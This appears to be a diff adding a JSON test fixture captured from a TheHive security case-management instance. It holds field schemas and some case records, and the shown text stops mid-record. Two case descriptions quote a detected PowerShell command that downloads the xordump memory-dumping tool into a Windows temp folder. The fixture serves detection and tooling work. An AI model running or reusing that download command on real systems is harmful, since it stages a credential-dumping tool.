@@ -1,0 +1,1950 @@
+{
+  "_provenance": {
+    "note": "REAL capture from TheHive 5.7.5-1 at 172.20.24.228, 2026-08-13. Supersedes the 2026-08-09 capture from 5.7.3 at 172.20.24.221 (that instance moved+upgraded again; old alert/case ids no longer exist). alert_detail/alert_observables replace the old function_payload \u2014 the custom getAlertWithObservables Function this deployment relied on is gone (404), but the stock /api/v1/query observables projection now returns reports[analyzer].taxonomies directly with no extraData needed, so the two-call stock shape captured here is what tools/thehive.py::get_full_alert_with_analysis actually calls.",
+    "captured": "2026-08-13",
+    "thehive_version": "5.7.5-1",
+    "thehive_url": "http://172.20.24.228:9000",
+    "chosen_alert_id": "~4661456",
+    "case_observables_case_id": "~4653208"
+  },
+  "describe_alert_enums": {
+    "label": "alert",
+    "path": "",
+    "initialQuery": "listAlert",
+    "attributes": [
+      {
+        "name": "_createdAt",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "_createdBy",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "_updatedAt",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "_updatedBy",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "assignee",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "case",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "closedDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "computed.handlingDuration",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "integer"
+      },
+      {
+        "name": "computed.handlingDurationInDays",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "integer"
+      },
+      {
+        "name": "computed.handlingDurationInHours",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "integer"
+      },
+      {
+        "name": "computed.handlingDurationInMinutes",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "integer"
+      },
+      {
+        "name": "computed.handlingDurationInSeconds",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "integer"
+      },
+      {
+        "name": "date",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "description",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "fulltextOnly",
+        "type": "string"
+      },
+      {
+        "name": "externalLink",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "follow",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "importDate",
+        "cardinality": "option",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "date"
+      },
+      {
+        "name": "imported",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "importedDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "inProgressDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "keyword",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "lastSyncDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "newDate",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "pap",
+        "cardinality": "single",
+        "values": [
+          0,
+          1,
+          2,
+          3
+        ],
+        "labels": [
+          "clear",
+          "green",
+          "amber",
+          "red"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "severity",
+        "cardinality": "single",
+        "values": [
+          1,
+          2,
+          3,
+          4
+        ],
+        "labels": [
+          "low",
+          "medium",
+          "high",
+          "critical"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "source",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "sourceRef",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "stage",
+        "cardinality": "single",
+        "values": [
+          "New",
+          "InProgress",
+          "Closed",
+          "Imported"
+        ],
+        "labels": [],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "status",
+        "cardinality": "single",
+        "values": [
+          "Duplicate",
+          "FalsePositive",
+          "Ignored",
+          "Imported",
+          "InProgress",
+          "New",
+          "Pending"
+        ],
+        "labels": [],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "summary",
+        "cardinality": "option",
+        "aggregable": false,
+        "indexType": "fulltextOnly",
+        "type": "string"
+      },
+      {
+        "name": "tags",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "timeToAcknowledge",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToAcknowledgeInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToAcknowledgeInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToAcknowledgeInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToAcknowledgeInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetect",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToDetectInDays",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetectInHours",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetectInMinutes",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetectInSeconds",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualify",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToQualifyInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualifyInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualifyInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualifyInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriage",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToTriageInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriageInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriageInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriageInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "title",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "fulltext",
+        "type": "string"
+      },
+      {
+        "name": "tlp",
+        "cardinality": "single",
+        "values": [
+          0,
+          1,
+          2,
+          3,
+          4
+        ],
+        "labels": [
+          "clear",
+          "green",
+          "amber",
+          "amber+strict",
+          "red"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "type",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      }
+    ]
+  },
+  "describe_case_enums": {
+    "label": "case",
+    "path": "",
+    "initialQuery": "listCase",
+    "attributes": [
+      {
+        "name": "_createdAt",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "_createdBy",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "_updatedAt",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "_updatedBy",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "actionRequired",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "boolean"
+      },
+      {
+        "name": "alertDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "alertImportedDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "alertInProgressDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "alertNewDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "assignee",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "caseLinks._createdAt",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "caseLinks.caseId",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "caseLinks.type",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "closedDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "computed.handlingDuration",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "integer"
+      },
+      {
+        "name": "computed.handlingDurationInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "computed.handlingDurationInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "computed.handlingDurationInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "computed.handlingDurationInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "description",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "fulltextOnly",
+        "type": "string"
+      },
+      {
+        "name": "endDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "external",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "externalLinks._createdAt",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "externalLinks.type",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "externalLinks.url",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "flag",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "handlingDuration",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "handlingDurationInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "handlingDurationInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "handlingDurationInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "handlingDurationInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "impactStatus",
+        "cardinality": "option",
+        "values": [
+          "NoImpact",
+          "NotApplicable",
+          "WithImpact"
+        ],
+        "labels": [],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "inProgressDate",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "keyword",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "newDate",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "number",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "observableRule",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "string"
+      },
+      {
+        "name": "owningOrganisation",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "pap",
+        "cardinality": "single",
+        "values": [
+          0,
+          1,
+          2,
+          3
+        ],
+        "labels": [
+          "clear",
+          "green",
+          "amber",
+          "red"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "patternId",
+        "cardinality": "list",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "string"
+      },
+      {
+        "name": "restricted",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "severity",
+        "cardinality": "single",
+        "values": [
+          1,
+          2,
+          3,
+          4
+        ],
+        "labels": [
+          "low",
+          "medium",
+          "high",
+          "critical"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "stage",
+        "cardinality": "single",
+        "values": [
+          "New",
+          "InProgress",
+          "Closed"
+        ],
+        "labels": [],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "startDate",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "status",
+        "cardinality": "single",
+        "values": [
+          "Duplicated",
+          "FalsePositive",
+          "InProgress",
+          "Indeterminate",
+          "New",
+          "Other",
+          "TruePositive"
+        ],
+        "labels": [],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "summary",
+        "cardinality": "option",
+        "aggregable": false,
+        "indexType": "fulltextOnly",
+        "type": "string"
+      },
+      {
+        "name": "tags",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "taskRule",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "none",
+        "type": "string"
+      },
+      {
+        "name": "timeToAcknowledge",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToAcknowledgeInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToAcknowledgeInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToAcknowledgeInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToAcknowledgeInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetect",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToDetectInDays",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetectInHours",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetectInMinutes",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToDetectInSeconds",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualify",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToQualifyInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualifyInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualifyInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToQualifyInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToResolve",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToResolveInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToResolveInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToResolveInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToResolveInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriage",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "timeToTriageInDays",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriageInHours",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriageInMinutes",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "timeToTriageInSeconds",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "float"
+      },
+      {
+        "name": "title",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "fulltext",
+        "type": "string"
+      },
+      {
+        "name": "tlp",
+        "cardinality": "single",
+        "values": [
+          0,
+          1,
+          2,
+          3,
+          4
+        ],
+        "labels": [
+          "clear",
+          "green",
+          "amber",
+          "amber+strict",
+          "red"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "viewingOrganisation",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      }
+    ]
+  },
+  "describe_observable_enums": {
+    "label": "observable",
+    "path": "",
+    "initialQuery": "listObservable",
+    "attributes": [
+      {
+        "name": "_createdAt",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "_createdBy",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "_updatedAt",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "_updatedBy",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "user"
+      },
+      {
+        "name": "attachment.contentType",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "attachment.hashes",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "attachment.id",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "attachment.name",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "attachment.size",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "integer"
+      },
+      {
+        "name": "data",
+        "cardinality": "option",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "dataType",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "ignoreSimilarity",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "ioc",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "keyword",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "message",
+        "cardinality": "single",
+        "aggregable": false,
+        "indexType": "fulltextOnly",
+        "type": "string"
+      },
+      {
+        "name": "pap",
+        "cardinality": "single",
+        "values": [
+          0,
+          1,
+          2,
+          3
+        ],
+        "labels": [
+          "clear",
+          "green",
+          "amber",
+          "red"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      },
+      {
+        "name": "relatedId",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "sighted",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "boolean"
+      },
+      {
+        "name": "sightedAt",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "startDate",
+        "cardinality": "single",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "date"
+      },
+      {
+        "name": "tags",
+        "cardinality": "list",
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "string"
+      },
+      {
+        "name": "tlp",
+        "cardinality": "single",
+        "values": [
+          0,
+          1,
+          2,
+          3,
+          4
+        ],
+        "labels": [
+          "clear",
+          "green",
+          "amber",
+          "amber+strict",
+          "red"
+        ],
+        "aggregable": true,
+        "indexType": "standard",
+        "type": "enumeration"
+      }
+    ]
+  },
+  "all_cases": [
+    {
+      "_id": "~8609848",
+      "_type": "Case",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786579350901,
+      "number": 1,
+      "title": "test",
+      "description": "this case is only for test",
+      "severity": 2,
+      "severityLabel": "MEDIUM",
+      "startDate": 1786579164931,
+      "tags": [],
+      "flag": false,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "status": "New",
+      "stage": "New",
+      "assignee": "analyst@local.com",
+      "access": {
+        "_kind": "OrganisationAccessKind"
+      },
+      "customFields": [],
+      "userPermissions": [
+        "manageCase/create",
+        "manageOrchestrator/readWorkflows",
+        "manageAlert/update",
+        "manageCaseTemplate",
+        "manageOrchestrator/deleteWorkflows",
+        "manageOrchestrator/deleteVariables",
+        "manageProcedure",
+        "managePage",
+        "manageObservable",
+        "manageCase/delete",
+        "manageCaseReport",
+        "accessTheHiveFS",
+        "manageDashboard",
+        "manageOrchestrator/writeWorkflows",
+        "manageShare",
+        "manageAnalyse",
+        "manageFunction/invoke",
+        "manageTask",
+        "manageCase/merge",
+        "manageOrchestrator/readVariables",
+        "manageCustomEvent",
+        "manageAlert/import",
+        "manageCase/changeOwnership",
+        "manageUser",
+        "manageComment",
+        "manageAlert/reopen",
+        "manageCaseAccess/restrict",
+        "manageTag",
+        "manageConfig",
+        "manageOrchestrator/writeVariables",
+        "managePageTemplate",
+        "manageAlert/create",
+        "manageAlert/delete",
+        "manageCaseReportTemplate",
+        "manageFunction/create",
+        "manageKnowledgeBase",
+        "manageCaseAccess/external",
+        "manageAction",
+        "manageCase/update",
+        "manageCase/reopen"
+      ],
+      "extraData": {},
+      "newDate": 1786579350859,
+      "timeToDetect": 185928
+    },
+    {
+      "_id": "~4653208",
+      "_type": "Case",
+      "_createdBy": "analyst@local.com",
+      "_updatedBy": "analyst@local.com",
+      "_createdAt": 1786579478784,
+      "_updatedAt": 1786579502984,
+      "number": 3,
+      "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
+      "description": "Detection engine: sigma\nRule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\nHost: win-kvkmd51ggkq (172.20.24.99)\nAgent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\nCommand line: \"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}",
+      "severity": 3,
+      "severityLabel": "HIGH",
+      "startDate": 1784710559000,
+      "endDate": 1786579502961,
+      "tags": [
+        "172.20.24.99",
+        "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+        "engine:sigma",
+        "rule:Suspicious Invoke-WebRequest Execution",
+        "security-onion",
+        "win-kvkmd51ggkq"
+      ],
+      "flag": false,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "status": "FalsePositive",
+      "stage": "Closed",
+      "summary": "this case is for test",
+      "assignee": "analyst@local.com",
+      "access": {
+        "_kind": "OrganisationAccessKind"
+      },
+      "customFields": [],
+      "userPermissions": [
+        "manageCase/create",
+        "manageOrchestrator/readWorkflows",
+        "manageAlert/update",
+        "manageCaseTemplate",
+        "manageOrchestrator/deleteWorkflows",
+        "manageOrchestrator/deleteVariables",
+        "manageProcedure",
+        "managePage",
+        "manageObservable",
+        "manageCase/delete",
+        "manageCaseReport",
+        "accessTheHiveFS",
+        "manageDashboard",
+        "manageOrchestrator/writeWorkflows",
+        "manageShare",
+        "manageAnalyse",
+        "manageFunction/invoke",
+        "manageTask",
+        "manageCase/merge",
+        "manageOrchestrator/readVariables",
+        "manageCustomEvent",
+        "manageAlert/import",
+        "manageCase/changeOwnership",
+        "manageUser",
+        "manageComment",
+        "manageAlert/reopen",
+        "manageCaseAccess/restrict",
+        "manageTag",
+        "manageConfig",
+        "manageOrchestrator/writeVariables",
+        "managePageTemplate",
+        "manageAlert/create",
+        "manageAlert/delete",
+        "manageCaseReportTemplate",
+        "manageFunction/create",
+        "manageKnowledgeBase",
+        "manageCaseAccess/external",
+        "manageAction",
+        "manageCase/update",
+        "manageCase/reopen"
+      ],
+      "extraData": {},
+      "newDate": 1786579478777,
+      "inProgressDate": 1786579502963,
+      "closedDate": 1786579502963,
+      "alertDate": 1784710559000,
+      "alertNewDate": 1786578719990,
+      "alertInProgressDate": 1786579478777,
+      "alertImportedDate": 1786579478777,
+      "timeToDetect": 1868160990,
+      "timeToTriage": 758787,
+      "timeToQualify": 758787,
+      "timeToAcknowledge": 1868919777,
+      "timeToResolve": 24184,
+      "handlingDuration": 24186
+    },
+    {
+      "_id": "~8613944",
+      "_type": "Case",
+      "_createdBy": "analyst@local.com",
+      "_updatedBy": "analyst@local.com",
+      "_createdAt": 1786579414752,
+      "_updatedAt": 1786579545235,
+      "number": 2,
+      "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
+      "description": "Detection engine: sigma\nRule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\nHost: win-kvkmd51ggkq (172.20.24.99)\nAgent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\nCommand line: \"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}",
+      "severity": 3,
+      "severityLabel": "HIGH",
+      "startDate": 1784710559000,
+      "endDate": 1786579545199,
+      "tags": [
+        "172.20.24.99",
+        "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+        "engine:sigma",
+        "rule:Suspicious Invoke-WebRequest Execution",
+        "security-onion",
+        "win-kvkmd51ggkq"
+      ],
+      "flag": false,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "status": "TruePositive",
+      "stage": "Closed",
+      "summary": "this closing is only for test",
+      "impactStatus": "WithImpact",
+      "assignee": "analyst@local.com",
+      "access": {
+        "_kind": "OrganisationAccessKind"
+      },
+      "customFields": [],
+      "userPermissions": [
+        "manageCase/create",
+        "manageOrchestrator/readWorkflows",
+        "manageAlert/update",
+        "manageCaseTemplate",
